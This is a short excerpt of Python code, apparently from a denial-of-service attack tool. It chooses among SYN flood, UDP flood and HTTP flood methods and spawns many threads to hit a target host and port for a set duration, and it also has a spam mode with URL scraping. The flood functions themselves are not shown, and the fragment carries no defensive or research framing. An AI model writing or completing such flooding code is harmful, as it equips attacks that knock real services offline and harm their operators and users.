...
if spam_mode:
    ...
    scraped_urls = 1
    if scrape_target:
        scraped_urls = int(get_numeric_input(
...
if method == 4:
    threads = [threading.Thread(target=syn_flood, args=(target, port, duration)) for _ in range(threads)]
elif method == 5:
    threads = [threading.Thread(target=udp_flood, args=(target, port, duration)) for _ in range(threads)]
else:
    threads = [threading.Thread(target=http_flooder_instance.run) for _ in range(threads)]
